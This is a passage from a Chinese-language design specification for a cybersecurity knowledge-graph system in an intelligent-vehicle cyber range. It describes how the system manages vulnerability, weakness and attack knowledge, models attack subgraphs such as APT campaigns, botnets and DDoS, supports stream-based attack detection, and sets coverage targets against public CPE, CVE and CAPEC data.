进行过滤，快速定位感兴趣的漏洞信息，为漏洞修复和风险评估提供支持。系统支持漏洞信息的详细展示，包括漏洞描述、可能受影响的资产、已有的修复方案等关键信息。这有助于用户全面了解漏洞的本质，从而更好地制定漏洞修复和安全防护策略。最重要的是，系统通过自动化的漏洞信息更新机制，及时获取最新的漏洞情报。这确保了用户能够始终使用包含最新漏洞知识的数据库，提高了系统对新兴威胁的感知能力。</p></li><li><p>系统在汽车漏洞知识管理方面提供了强大而全面的支持，涵盖了广泛的漏洞类型和受影响的资产范围。系统收录了包括内存溢出、目录穿越、整数溢出、解析错误、HTTP响应伪造、越权访问、ShellCode攻击、HTTP请求伪造、SQL注入、代码执行、任意文件创建、缓存区过读、远程密码修改、暴力破解、远程溢出等，漏洞数量大于2000个。这些漏洞不仅涵盖了车端网联零部件，如TBOX、网关、车机等，还涉及到各类关键资产，包括各类域控制器、中央处理单元、OTA（Over-the-Air升级系统）、AVP（Audio Video Protocol）、数字钥匙、远程控车等车联网业务管理后台。系统不仅详细记录了每个漏洞的CVE编号、危害等级、漏洞类型、威胁类型和漏洞描述等关键信息，还提供了修复建议和最新的安全补丁信息。系统支持用户通过直观的界面轻松浏览和检索这些漏洞信息，利用过滤条件快速定位感兴趣的漏洞。此外，系统还定期更新漏洞知识库，以确保用户能够获取到最新的汽车漏洞信息，帮助他们及时制定并实施相应的安全措施。这一功能的全面性、用户友好的界面和及时更新确保了用户在日常安全管理中能够高效而有针对性地应对复杂的汽车网络安全挑战。</p></li><li><p>系统提供了对漏洞知识的灵活管理工具，支持批量新增、更新、删除漏洞信息，并具备基于属性按条件模糊查询的功能，以方便用户对漏洞知识库进行高效管理和快速检索。首先，用户可以通过系统界面进行批量新增漏洞信息。这意味着用户可以一次性添加多个漏洞，通过简单的填写表格或上传漏洞信息文件的方式，快速建立漏洞知识库。其次，系统支持批量更新漏洞信息。当漏洞信息发生变化或有新的安全补丁发布时，用户可以一次性选择多个漏洞进行更新，确保知识库中的信息始终保持最新状态。系统还提供了批量删除漏洞信息的功能。用户可以根据需要一次性删除多个漏洞，从而灵活地管理知识库中的信息，保持库内数据的整洁性和准确性。同时，用户可以利用系统的高级查询功能，基于属性按条件模糊查询漏洞信息。这意味着用户可以通过指定各种条件，如CVE编号、危害等级、漏洞类型、威胁类型等，来快速过滤出符合特定要求的漏洞信息，提高了信息检索的精确性和效率。总体而言，系统通过支持对漏洞知识的批量新增、更新、删除，并提供基于属性按条件模糊查询的功能，为用户提供了一套强大而灵活的漏洞管理工具。</p></li><li><p>系统支持对漏洞知识进行多维度的统计分析，用户可以根据年份、CVSS分数、漏洞类型和威胁程度等属性进行详细的统计。首先，用户可以按照年份进行统计分析，了解每年发现的漏洞数量趋势。这有助于用户更好地理解漏洞的发展趋势，从而更有针对性地进行漏洞管理和安全决策。其次，系统支持按照CVSS分数进行统计，用户可以了解各个分数范围内的漏洞数量及其占比情况。这有助于用户对漏洞危险程度的分布有更清晰的认识，能够更有针对性地制定漏洞修复和防护策略。系统还提供了按照漏洞类型进行统计的功能。用户可以了解各种漏洞类型的分布情况，从而更有针对性地进行安全评估和漏洞管理。最后，系统支持按照威胁程度进行统计分析。用户可以了解不同威胁程度的漏洞数量及其分布情况，有助于用户更精确地了解漏洞对系统安全的潜在威胁。</p></li><li><p>系统支持漏洞知识与受影响的操作系统、硬件、软件等关联，并提供模糊查询的功能，以帮助用户更全面地了解漏洞的影响范围，有针对性地采取相应的防护措施。首先，漏洞知识库中的每个漏洞都与受影响的操作系统、硬件、软件等相关联。这意味着用户可以查看漏洞的详细信息，包括其影响的操作系统版本、兼容的硬件平台以及可能受影响的软件组件。其次，系统支持模糊查询功能，用户可以通过指定关键词或属性来查询与之相关的漏洞信息。这有助于用户更迅速地获取特定操作系统、硬件或软件受影响的漏洞列表，为风险评估和漏洞修复提供便利。用户可以根据需要，通过系统界面进行漏洞信息的筛选和排序，以便更清晰地了解与特定操作系统、硬件或软件相关的漏洞情况。这使得用户能够有针对性地应对特定环境中的漏洞风险，提高了系统的适应性和实用性。</p></li><li><p>系统支持弱点知识管理，覆盖了漏洞CWE编号、描述、关系、适用平台、常见后果、利用可能性、缓解措施等关键信息。这一功能旨在帮助用户全面了解系统中可能存在的弱点，为其提供有针对性的缓解措施和风险管理建议。首先，系统收录了编号和描述，使用户能够迅速识别和了解不同弱点的特征和本质。这有助于用户更有效地进行弱点分类和分析。其次，系统关注弱点之间的关系，以便用户了解弱点之间的相互影响和可能的传播路径。这有助于用户更全面地评估系统的整体安全状况，有助于制定综合性的防护策略。系统还记录了弱点适用的平台信息，让用户清晰地了解在哪些系统或应用中可能存在特定弱点。这有助于用户更有针对性地进行安全评估和风险管理。常见后果、利用可能性和缓解措施等信息也被纳入系统，使用户能够深入了解弱点可能导致的风险、可能的攻击方式以及如何有效地减轻或消除这些风险。</p></li><li><p>系统支持漏洞知识与弱点知识的关联，通过弱点编号引用的方式建立二者之间的关系。这一功能旨在帮助用户更深入地了解系统中的漏洞与弱点之间的关联关系，为漏洞修复和弱点缓解提供更全面的指导。首先，系统允许用户在漏洞信息中引用相应的弱点编号。通过在漏洞信息中添加引用，用户可以明确指明该漏洞与哪个具体的弱点相关联。这有助于建立漏洞与弱点之间的直接关系，提高了系统的关联性和信息的准确性。其次，用户可以通过系统界面轻松地浏览漏洞信息，查看其引用的弱点编号，并直接访问与之关联的弱点知识。这使得用户能够在查看漏洞信息的同时，获取有关该漏洞背后潜在弱点的详细信息，帮助用户更全面地理解和评估风险。这种基于弱点编号引用的关联机制为用户提供了一种直观而便捷的方式，以便在漏洞管理过程中更有效地掌握与弱点相关的信息。这一功能的直观性和关联性，有助于用户更有针对性地采取措施，提高了系统在漏洞修复和弱点缓解方面的实用性。</p></li><li><p>系统提供了全面的基础攻击知识管理功能，包括攻击编号、攻击名称、攻击可能性、威胁等级、技能要求、资源要求、先决条件、执行流程、后果、缓解措施、相关脆弱性等重要信息，以帮助用户深入了解各类基础攻击，并提供详细的信息以支持漏洞管理、风险评估和安全决策。系统还支持基础攻击分类，包括扫描探测类、攻击突破类、远程控制、窃取利用类等。每种基础攻击都被赋予独特的攻击编号，以便用户能够迅速识别和索引。攻击名称则提供了对攻击本质的简明描述，方便用户更快速地理解攻击类型。攻击可能性和威胁等级的记录帮助用户全面了解攻击的潜在威胁程度，有助于评估系统安全性。技能要求和资源要求方面的信息使用户能够了解攻击者执行该攻击所需的技术水平和资源，从而更好地制定相应的防范策略。系统记录了先决条件和详细的执行流程，使用户能够深入理解攻击的实际过程。攻击成功后可能产生的后果和相应的缓解措施提供了有针对性的安全建议，以便用户及时采取措施应对潜在威胁。此外，系统还支持扫描探测类、攻击突破类、远程控制、窃取利用类等基础攻击分类。</p></li><li><p>系统提供了灵活而强大的基础攻击知识管理功能，允许用户轻松进行批量新增、更新和删除操作，同时支持基于属性的按条件模糊查询相关知识，以满足用户在攻击知识管理方面的多样化需求。用户可以通过系统界面进行批量新增基础攻击知识，简化了信息录入过程，提高了效率。同时，对于已存在的基础攻击知识，系统支持批量更新操作，确保用户能够及时反映最新的安全威胁信息。在基础攻击知识的管理过程中，用户可能需要根据特定条件或属性来删除不再适用或不准确的信息。系统允许用户进行批量删除操作，以确保攻击知识库的及时性和准确性。此外，系统提供了强大的查询功能，用户可以基于各种属性进行条件模糊查询，包括攻击名称、攻击可能性、威胁等级、技能要求、攻击分类等。这样的查询功能使用户能够迅速定位特定类型或特定属性的基础攻击知识，为漏洞管理和安全决策提供及时支持。</p></li><li><p>系统提供了强大而全面的复杂攻击知识管理功能，以确保用户在面对高级威胁时能够深入了解攻击的执行细节和技术手段。该功能包括对每个攻击步骤的基础攻击编号、利用的漏洞、使用的工具以及时空关系等详尽的复杂攻击知识。首先，记录了每个攻击步骤所涉及的基础攻击编号，使用户能够追溯到攻击的根本技术原理。这一特性为用户提供了对攻击手段的深刻理解，有助于制定更加精准和有效的防御策略。其次，对于每个攻击步骤，系统详细描述了利用的漏洞。这包括漏洞的性质、漏洞编号等信息，帮助用户快速了解攻击者是如何利用系统中的漏洞进行入侵的，从而提高对潜在威胁的感知。系统还记录了在执行每个攻击步骤时使用的工具，这有助于用户迅速识别异常行为和攻击活动。通过了解攻击者选择的工具，用户能够更好地理解攻击者的意图和技术水平。最后，时空关系的记录使用户能够了解攻击步骤之间的时间序列和空间关联。这提供了对攻击执行逻辑和可能的传播路径的深入洞察，有助于加强整体安全防护。</p></li><li><p>系统专门支持汽车攻击场景下的复杂攻击知识管理，以确保对于汽车网络安全的全面防护。这一功能涵盖了多个方面的攻击知识，包括攻击类型、漏洞等，以帮助用户更好地理解和对抗在汽车领域可能面临的复杂威胁。首先，系统详细记录了各种汽车攻击场景中可能涉及的攻击类型。这包括但不限于对车载设备的物理攻击、网络通信的拦截与篡改、远程控制的滥用等。通过清晰定义不同的攻击类型，用户能够更好地了解潜在威胁并制定相应的安全防护策略。其次，系统追踪并汇总了与汽车攻击场景相关的漏洞信息。这包括车载设备、车联网通信、车辆控制系统等方面的漏洞，使用户能够迅速了解汽车系统中存在的潜在安全隐患。通过对漏洞的深入了解，用户可以采取有针对性的措施来加强汽车网络的安全性。这一功能的特点在于将复杂攻击知识与汽车攻击场景相结合，提供了一个专门针对汽车安全的知识管理工具。这有助于用户在汽车网络安全领域中更好地评估风险、部署防护措施，并及时应对可能的威胁。</p></li><li><p>系统为用户提供了灵活而强大的功能，支持对复杂攻击知识进行批量新增、更新和删除，并提供了基于属性的按条件模糊查询，以满足用户在复杂攻击知识管理方面的多样化需求。首先，用户可以通过系统界面方便地进行批量新增复杂攻击知识，简化了信息录入的过程，提高了用户的工作效率。此外，对于已有的复杂攻击知识，系统支持批量更新操作，确保用户能够及时更新最新的安全威胁信息。其次，对于一些不再适用或需要删除的复杂攻击知识，系统支持批量删除操作，以保持知识库的准确性和实用性。这样的功能确保用户能够灵活地管理和维护复杂攻击知识库。除此之外，系统提供了强大的查询功能，用户可以根据各种属性进行条件模糊查询。这包括攻击类型、涉及的漏洞、时空关系等关键属性。这使用户能够快速准确地定位所需的复杂攻击知识，为漏洞管理和安全决策提供及时支持。</p></li><li><p>系统支持对资产、攻击、漏洞等知识实体的全面表示，以及它们之间的属性和相互关系，并以结构化数据的形式进行组织。这一功能旨在提供用户一个清晰而有序的知识体系，使其能够更深入地理解和管理各种关键信息。首先，系统通过定义和记录资产的属性，如操作系统、应用程序、产品名称、版本、关联厂商等，使用户能够迅速获取有关资产的详细信息。这有助于形成资产清单，并为安全管理提供了必要的基础。其次，攻击实体也得到了详尽的描述，包括攻击编号、攻击名称、可能性、威胁等级、技能要求、资源要求、先决条件等属性。通过对攻击实体属性的完善记录，用户能够深入了解不同攻击的特征和威胁程度。漏洞实体的属性也得到了充分的考虑，包括漏洞CVE编号、危害等级、漏洞类型、威胁类型、漏洞描述等。这一详细的漏洞信息有助于用户全面了解系统中存在的潜在风险，并采取相应的安全措施。关键在于，系统通过记录这些实体之间的相互关系，建立了一种有机的结构化数据组织形式。例如，资产可能受到攻击，攻击可能利用漏洞，漏洞可能影响资产。这种结构化的关联有助于用户在复杂的网络安全环境中更好地理解各个元素之间的关系，有针对性地制定安全策略和实施风险管理。</p></li><li><p>系统提供了强大的网络安全知识图谱功能，支持在靶场汽车应用试验中构建应用试验相关的试验场景图谱。通过结合网络安全知识图谱中的深刻知识，实现了与试验关联的节点、资产和漏洞数据的全面关联，构建形成应用试验相关的试验场景图谱，以支撑攻击检测分析和扩展研究。在这个图谱中，关联的节点涵盖了被测车辆、零部件、虚拟化MCU、虚拟化MPU等四种类型。这些节点之间的关系被清晰地呈现，使用户能够直观地了解试验场景中各元素之间的相互关联。关联的资产至少包含整车品牌、车型、车辆、车型项目（年款）、包含的零部件的硬件平台、操作系统内核版本信息、固件版本、中间件版本、应用程序版本等九类信息。这些资产信息的关联与展示，使用户能够深入了解试验中使用的各种资产，有助于对整体系统的安全性进行全面评估。漏洞数据方面，图谱包含漏洞名称、CVE编号、涉及平台、危害级别、漏洞类型、公开日期等六类信息。这些漏洞信息与资产、节点的关联，为用户提供了在试验场景中可能存在的潜在威胁的清晰认识。整个试验场景图谱以可视化的形式呈现，使用户能够轻松理解试验中的网络拓扑、资产分布、漏洞关联等关键信息。这为攻击检测、分析和进一步的研究提供了有力的支持，帮助用户更好地理解试验中的网络安全状况，及时采取必要的安全措施。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/34dc0d06a9c90b8756ec8bdf12a61675.png" alt="1705430824907"></p></li><li><p>系统支持在靶场试验场景图谱中表示知识子图，其中包括基础攻击知识子图和复杂攻击知识子图。系统支持快速在联邦靶场之间实现知识共享。通过将知识子图表示为独立的实体，用户可以方便地在不同联邦靶场之间共享攻击知识。这一功能旨在帮助用户更加灵活和精确地管理各类攻击知识，使其能够以更直观的方式理解和应对试验场景中的威胁。首先，基础攻击知识子图呈现了试验场景中可能发生的基本攻击手段和技术。这包括扫描探测类、攻击突破类、远程控制、窃取利用类等基础攻击类型。通过将这些基础攻击知识以子图形式表示，用户能够更加系统地了解试验中可能发生的基础攻击情景。其次，复杂攻击知识子图展示了在试验场景中可能涉及的复杂攻击的各个步骤、利用的漏洞、使用的工具等详细信息。这有助于用户全面理解复杂攻击的执行逻辑，加强对试验中高级威胁的感知。复杂攻击知识子图的呈现使用户能够更加深入地了解攻击者的手段和可能的进攻路径。最重要的是，系统支持快速在联邦靶场之间实现知识共享。通过将知识子图表示为独立的实体，用户可以方便地在不同联邦靶场之间共享攻击知识，促进安全团队之间的协作与信息交流。此外，系统还实现了与分布式联邦靶场的在线同步知识，确保每个靶场都能及时获得最新的攻击知识，以应对不断演进的威胁。</p></li><li><p>系统支持基础攻击知识子图的表示，其中包括基础攻击类型与安全事件的实例关系、基础攻击类型与漏洞的利用关系，以及漏洞与资产的存在关系。这一功能旨在为用户提供一种直观、全面的方式来理解基础攻击的执行逻辑、攻击类型与漏洞的关联，以及漏洞如何影响资产的安全性。首先，基础攻击类型与安全事件的实例关系呈现了在试验场景中可能发生的具体安全事件。通过将基础攻击类型与实例关联，用户可以清晰地了解每种攻击类型可能引发的具体安全事件，帮助他们更好地了解试验中的威胁情景。其次，基础攻击类型与漏洞的利用关系展示了每种攻击类型可能利用的漏洞。这有助于用户深入理解攻击者是如何利用特定漏洞实施基础攻击的，为漏洞管理提供了实质性的信息支持。最后，漏洞与资产的存在关系呈现了漏洞如何影响资产的安全性。这一关系展示了在试验场景中，资产可能受到哪些漏洞的威胁，使用户能够有针对性地采取防御措施，提高整体系统的安全性。这一综合的表示形式通过子图的方式，以可视化的形式清晰地展现了基础攻击知识之间的关联，使用户能够更加直观地理解攻击事件、漏洞与资产之间的复杂关系。这有助于加强对试验场景中潜在威胁的感知，提高整个系统的安全防护水平。</p></li><li><p>系统实现了基础攻击知识子图的全面表示，其中包括探测型、破坏型、控制型和资源消耗型攻击子图。这一功能旨在为用户提供更加细致和全面的基础攻击知识，使其能够更全面地了解试验场景中可能发生的各类攻击类型及其特征。首先，探测型攻击子图呈现了试验场景中可能存在的各种探测手段和技术。这包括攻击者可能使用的各类探测方法，以便识别系统中的弱点和薄弱环节。通过详细展示探测型攻击子图，用户能够更好地理解攻击者如何在试验中执行探测活动，从而采取相应的安全措施。其次，破坏型攻击子图显示了试验场景中可能发生的各种破坏性攻击。这包括攻击者可能采用的破坏手段，以及对系统可用性和完整性的潜在威胁。通过清晰地展示破坏型攻击子图，用户可以更好地了解潜在的系统崩溃和瘫痪风险，以及如何有效地应对这些威胁。第三，控制型攻击子图展现了攻击者可能采用的各类控制手段，以获取对系统的控制权。这包括远程控制、横向扩散等攻击手法。通过细致地展示控制型攻击子图，用户能够更深入地了解攻击者可能如何劫持系统，从而采取适当的安全策略。最后，资源消耗型攻击子图呈现了试验场景中可能发生的各种资源耗尽手段。这包括攻击者可能使用的方法，以削弱系统性能、耗尽带宽或占用计算资源。通过清晰地展示资源消耗型攻击子图，用户能够更好地了解试验中可能面临的性能和资源压力，从而采取相应的保护措施。这一全面的基础攻击知识子图表示通过分类覆盖了探测型、破坏型、控制型和资源消耗型攻击，为用户提供了更为细致和直观的攻击知识体系。这有助于用户更全面地理解试验中各种攻击类型的特点和潜在风险，为制定针对性的安全策略提供了有力支持。</p></li><li><p>系统支持详尽展示探测型基础攻击子图，其中包含了多个关键的漏洞探测手段，包含漏洞软件扫描、资源泄漏暴露、目录索引、未公开的网页检测、信息启发、TCP连接扫描等，旨在为用户提供全面了解试验场景中可能发生的各类探测型攻击，帮助他们更好地识别潜在威胁并采取相应的安全措施。首先，漏洞软件扫描是探测型攻击子图的重要组成部分之一。这包括使用漏洞扫描工具主动寻找系统中存在的漏洞，有助于用户及早发现并解决可能被攻击利用的弱点，提高系统整体的安全性。其次，资源泄漏暴露是探测型攻击子图中的另一关键元素。攻击者可能尝试通过各种手段，如文件和目录遍历、错误配置的数据库等，来获取系统内部敏感信息。通过展示资源泄漏暴露的情况，用户可以更好地了解可能面临的信息泄露风险，从而制定有效的保护策略。目录索引和未公开的网页检测是探测型攻击子图中涉及的进一步手段。攻击者可能尝试寻找系统中存在的目录索引或未公开的网页，通过此类信息的发现，攻击者可获得更多的攻击路径和目标。通过清晰地呈现这些探测手段，用户可以更全面地了解攻击者可能的侵入方式。此外，信息启发和TCP连接扫描也是探测型攻击子图中的关键元素。信息启发涉及从非常规渠道收集信息，以获取目标系统的更多细节。而TCP连接扫描则是通过探测目标系统的开放端口，获取有关系统网络结构的信息。这些手段的展示有助于用户全面了解探测型攻击的多样性和潜在威胁。这一细致而全面的探测型基础攻击子图表示，使用户能够更加深入地了解试验场景中可能发生的各种探测型攻击类型及其具体手段。这有助于用户采取有针对性的安全措施，提高系统对潜在威胁的抵御能力。</p></li><li><p>系统支持破坏型基础攻击子图的详尽展示，其中包含了多个关键的破坏性攻击手段，包含对象注入、协议篡改、鱼叉式网络钓鱼、身份认证滥用、功能绕过、过度资源分配、跨站脚本（XSS）攻击、点击劫持、SQL盲注、代码注入、XML注入、TCP泛洪等，旨在为用户提供全面了解试验场景中可能发生的各类破坏型攻击，以帮助用户更好地识别和防范潜在威胁。首先，对象注入是破坏型攻击子图中的重要元素之一。攻击者可能尝试通过向系统注入恶意对象，来破坏系统的正常运行。这可能包括恶意文件、脚本或其他危险的对象。系统清晰呈现对象注入的情况有助于用户及早发现并阻止可能的破坏行为，提高系统整体的安全性。其次，协议篡改是破坏型攻击子图中的关键手段之一。攻击者可能试图篡改通信协议，以干扰正常的数据传输，或者窃取敏感信息。通过详细展示协议篡改的情况，用户能够更好地理解潜在的通信风险，从而加强系统的安全保护。鱼叉式网络钓鱼和身份认证滥用是破坏型攻击子图中涉及的进一步手段。鱼叉式网络钓鱼可能包括对用户进行欺骗，以获取其敏感信息，而身份认证滥用可能包括对认证机制的滥用，以获取未授权的访问权。这些手段的展示有助于用户更全面地了解攻击者可能的社会工程学和身份认证攻击方式。功能绕过、过度资源分配、跨站脚本（XSS）攻击、点击劫持、SQL盲注、代码注入、XML注入和TCP泛洪等都是破坏型攻击子图中的关键攻击手段。这些手段的展示有助于用户深入了解试验场景中可能发生的各种破坏型攻击类型及其具体手段。用户可以通过对这些攻击手段的了解，采取更加有针对性的安全措施，以应对潜在的威胁。这一详实而全面的破坏型基础攻击子图表示，使用户能够更深入地了解试验场景中可能发生的各种破坏型攻击，为其制定有效的安全策略提供了有力支持。系统的展示形式使用户能够清晰地识别潜在威胁，从而更好地加强系统的安全性。</p></li><li><p>系统支持基于攻击名称进行某类型攻击子图的模糊查询，为用户提供了便捷而直观的搜索功能。用户可以通过输入攻击名称，快速定位到特定类型的攻击子图，从而更全面地了解试验场景中可能的威胁情境。一旦用户选择了特定的攻击子图，系统以图谱的方式清晰展示选中的攻击子图，通过直观的可视化呈现，用户能够深入了解基础攻击与安全事件、基础攻击与漏洞、安全事件与弱点、漏洞与操作系统/软件之间的关联关系。首先，基础攻击与安全事件的关联在图谱中得以展示，用户可以明晰了解攻击的发起和导致的安全事件，帮助他们理解攻击的后果以及如何更好地应对安全威胁。其次，基础攻击与漏洞之间的关系也在图谱中得以清晰呈现。用户可以直观地看到攻击手段与系统漏洞之间的连接，为漏洞管理和修复提供有力的参考，帮助用户有针对性地加强系统的安全性。安全事件与弱点之间的关联同样在图谱中得到展示，用户可以深入了解安全事件可能导致的系统弱点，从而更好地规划和实施强化安全性的措施。最后，漏洞与操作系统/软件之间的关联关系也以清晰的方式在图谱中呈现。用户可以通过这一关系了解系统漏洞与底层软件和操作系统的关联，为系统的漏洞修复提供指导和依据。这一图谱展示的方式不仅提供了直观的信息，还通过关联关系的清晰呈现，使用户能够全面了解试验场景中攻击与安全事件、漏洞、弱点、操作系统/软件之间的复杂关系。这有助于用户更全面地理解威胁情境，采取更有针对性的防御策略，从而提高整体系统的安全性。</p></li><li><p>系统支持基于攻击名称进行某类型攻击子图的模糊查询，为用户提供了便捷而直观的搜索功能。能够表示基础攻击的时序关系和空间关系。用户可以通过输入攻击名称，快速定位到特定类型的攻击子图，从而更全面地了解试验场景中可能的威胁情境。一旦用户选择了特定的攻击子图，系统以图谱的方式清晰展示选中的攻击子图，通过直观的可视化呈现，用户能够深入了解基础攻击与安全事件、基础攻击与漏洞、安全事件与弱点、漏洞与操作系统/软件之间的关联关系。首先，基础攻击与安全事件的关联在图谱中得以展示，用户可以明晰了解攻击的发起和导致的安全事件，帮助他们理解攻击的后果以及如何更好地应对安全威胁。其次，基础攻击与漏洞之间的关系也在图谱中得以清晰呈现。用户可以直观地看到攻击手段与系统漏洞之间的连接，为漏洞管理和修复提供有力的参考，帮助用户有针对性地加强系统的安全性。安全事件与弱点之间的关联同样在图谱中得到展示，用户可以深入了解安全事件可能导致的系统弱点，从而更好地规划和实施强化安全性的措施。最后，漏洞与操作系统/软件之间的关联关系也以清晰的方式在图谱中呈现。用户可以通过这一关系了解系统漏洞与底层软件和操作系统的关联，为系统的漏洞修复提供指导和依据。这一图谱展示的方式不仅提供了直观的信息，还通过关联关系的清晰呈现，使用户能够全面了解试验场景中攻击与安全事件、漏洞、弱点、操作系统/软件之间的复杂关系。这有助于用户更全面地理解威胁情境，采取更有针对性的防御策略，从而提高整体系统的安全性。在复杂攻击知识子图中，系统注重表示基础攻击的时序关系和空间关系。时序关系是指攻击者在实施攻击时的时间顺序和先后关系，例如某个攻击步骤的前置条件、触发条件和后续影响等。空间关系则涉及到攻击者在网络空间中的位置和移动轨迹，例如攻击源、攻击目标和攻击路径等。通过正确组合基础攻击知识子图，复杂攻击知识子图能够全面地揭示攻击者的行为模式和攻击意图，从而为态势感知系统提供更加精准和可靠的信息。</p></li><li><p>系统支持复杂攻击知识子图的生成，其中包括APT攻击、僵尸网络、DDoS、蠕虫攻击等多种攻击子图的表示，能够支持以图谱的方式可视化展示。这一功能旨在全面展示试验场景中可能涉及的各类高级和复杂攻击手段，为用户提供详尽的安全威胁认识。首先，APT攻击子图呈现了高级持续性威胁的攻击过程。用户可以通过图谱清晰地看到攻击者渗透系统、横向移动、搜集信息、保持持久性等多个阶段，全面了解APT攻击的时序关系和空间关系。这有助于提高用户对潜在威胁的警觉性，采取有效措施应对APT攻击。其次，僵尸网络攻击子图展示了通过控制大量受感染计算机形成的僵尸网络进行攻击的情境。用户可以直观地了解攻击者如何利用僵尸网络发动分布式拒绝服务（DDoS）攻击、进行信息窃取等行为，有助于用户建立对僵尸网络攻击的防范意识。DDoS攻击子图清晰地展示了试验场景中可能发生的分布式拒绝服务攻击手段。用户能够了解攻击者如何通过协同多个节点发动大规模攻击，干扰正常的网络服务。这种可视化方式有助于用户制定更有效的网络防护策略。蠕虫攻击子图展示了通过网络传播的自我复制程序，它可以在系统中迅速传播，对网络和系统造成广泛的破坏。用户通过图谱可以了解蠕虫攻击的传播路径、感染规律等关键信息，从而更好地应对可能的蠕虫攻击威胁。这些攻击子图通过图谱的方式进行可视化展示，使用户能够直观地理解试验场景中可能发生的APT攻击、僵尸网络攻击、DDoS攻击、蠕虫攻击等复杂攻击行为，有助于提高用户对安全威胁的认知水平，从而更好地制定、实施防御策略。</p></li><li><p>系统支持APT攻击类复杂攻击子图，其中包含了多种常见的高级持续性威胁（APT）攻击子图的表示，如海莲花攻击、夜龙攻击、Luckycat攻击、Heartbeat攻击、MiniDuke攻击、Turla攻击、Ke3chang攻击、NetTraveler攻击等。这一功能的目的在于为用户提供深入了解试验场景中可能发生的APT攻击行为的工具。首先，海莲花攻击子图展示了一种典型的APT攻击手段。用户可以通过图谱清晰地看到攻击者渗透系统、搜集情报、保持持久性等多个攻击阶段的时序关系和空间关系。这有助于提高用户对海莲花攻击的认知水平，加强对此类高级威胁的防范。其次，夜龙攻击子图呈现了夜龙攻击的攻击过程。用户能够直观地了解攻击者如何通过多个步骤实施攻击、横向移动、获取敏感信息等，帮助用户更好地理解夜龙攻击的复杂性。Luckycat攻击子图清晰地展示了Luckycat攻击的攻击手法。用户可以逐步了解攻击者的入侵路径、攻击步骤和潜在的影响，以更好地做好安全防范和应对工作。Heartbeat攻击子图展示了Heartbeat攻击的传播路径和影响。用户可以通过图谱了解攻击者如何利用Heartbeat漏洞发起攻击，帮助用户及早发现和缓解此类威胁。MiniDuke攻击子图展现了MiniDuke攻击的时序和空间关系，用户可以更全面地了解MiniDuke攻击的发展过程，以便采取相应的安全措施。Turla攻击子图清晰地呈现了Turla攻击的攻击路径和影响，用户可以通过图谱更深入地了解Turla攻击的行为模式。Ke3chang攻击子图展示了Ke3chang攻击的复杂攻击手法，帮助用户理解攻击者如何突破网络防线、渗透系统、窃取敏感信息等。最后，NetTraveler攻击子图展现了NetTraveler攻击的攻击过程和空间关系，用户可以通过图谱更直观地理解NetTraveler攻击的特征和潜在风险。这些APT攻击类复杂攻击子图的可视化展示有助于用户全面了解试验场景中可能发生的高级威胁行为，提高对潜在风险的认知水平，从而更有针对性地制定安全防范策略。</p></li><li><p>系统支持智能汽车网络靶场联网业务的入侵攻击等攻防演练场景，其中包括了车云业务的攻击子图表示。这一功能的目的在于为用户提供深入了解智能汽车网络中可能发生的入侵攻击行为的工具，帮助用户更全面地认知并防范潜在的汽车网络威胁。首先，车云业务入侵攻击子图展示了在联网汽车环境中可能发生的入侵攻击场景。用户通过图谱清晰地看到攻击者如何试图入侵车云业务，可能的攻击路径、攻击手段以及潜在的危害。这有助于用户更全面地了解汽车网络中的威胁形势，从而采取相应的安全措施。其次，智能汽车网络靶场攻防演练场景攻击子图呈现了多种可能的攻击手法，包括但不限于针对车辆网络通信的拦截攻击、对车辆系统的远程攻击、对车载云服务的恶意访问等。用户可以通过图谱清晰地了解攻击者的目标、攻击路径和可能的影响，以便更好地制定汽车网络的防御策略。这些攻击子图通过图谱的方式进行可视化展示，使用户能够直观地了解智能汽车网络中可能发生的入侵攻击行为，加深对汽车网络威胁的认知水平，有助于用户更加有效地规遍和实施防范措施。</p></li><li><p>系统支持将基础攻击子图与复杂攻击子图注册到流计算引擎，为用户提供了一种强大的工具来进行复杂攻击检测与有效攻击检测。这一功能的实现旨在充分利用流计算引擎的实时性和高效性，使用户能够及时捕获并响应试验场景中可能发生的复杂攻击行为。首先，通过注册基础攻击子图，用户可以将特定基础攻击类型的实例关系、漏洞利用关系等信息引入流计算引擎。这允许系统在实时流数据中检测并匹配基础攻击行为，为进一步的复杂攻击检测奠定基础。其次，复杂攻击子图的注册使得系统能够在流计算引擎中实时分析和检测更为复杂的攻击模式，其中包含了基础攻击的正确组合、时序关系和空间关系。这有助于系统更全面地了解试验场景中的攻击行为，提高检测的精准性和效率。流计算引擎的实时性使得能够在攻击发生的瞬间对流数据进行分析，及时发现潜在的复杂攻击。同时，高效性确保了系统可以处理大规模、高频率的数据流，确保在试验过程中能够持续有效地进行攻击检测。</p></li></ol><h4 id="性能实施方案-24"><a href="#性能实施方案-24" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><ol><li>场景知识图谱中资产知识对公开CPE的覆盖率在95%及以上。这意味着系统广泛收集、整理并涵盖了大部分公开的CPE信息，包括操作系统、应用程序以及其他相关的软硬件产品的标准化标识。高覆盖率确保了系统在试验场景中能够全面了解和管理各种资产，从而更好地进行安全性评估、漏洞检测和攻击防范。用户可以放心依赖系统的资产知识，获取准确而全面的信息，为智能汽车系统的安全性提供可靠支持。</li><li>场景知识图谱中漏洞知识对公开CVE的覆盖率达在95%及以上。这表示系统广泛地收集、整理并涵盖了绝大多数公开的CVE信息，包括各种软件、系统和服务的已知漏洞。高覆盖率确保了系统能够及时获取最新的漏洞信息，并为用户提供准确而全面的漏洞知识。这对于系统的安全性评估、资产漏洞检测和攻击防范至关重要，用户可以依赖系统的漏洞知识来快速响应和防范潜在威胁。</li><li>场景知识图谱中攻击知识对公开CAPEC的覆盖率在95%及以上。这表示系统广泛地收集、整理并涵盖了绝大多数公开的CAPEC信息，包括各种攻击模式、攻击手法和攻击者的行为模式。高覆盖率确保了系统能够提供准确而全面的攻击知识，为用户更好地理解和应对各类攻击提供了有力支持。这对于系统的安全性评估、攻击检测和威胁情报分析非常关键，用户可以依赖系统的攻击知识来加强对潜在攻击的识别和防范。</li><li>系统支持50种复杂攻击知识子图，这意味着为用户提供了广泛而深入的复杂攻击模式的表示和检测能力。这些复杂攻击知识子图涵盖了多样的攻击场景和模式，旨在为用户提供全面、深刻的安全威胁识别和分析工具。系统对于这50种复杂攻击知识子图的支持，保证了用户在进行试验场景的安全性评估和攻击防范时能够充分考虑到各种复杂的威胁情境。这对于确保系统的全面性、可靠性和实用性具有重要的意义。</li></ol><h4 id="技术实现内容-24"><a href="#技术实现内容-24" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="方案设计-11"><a 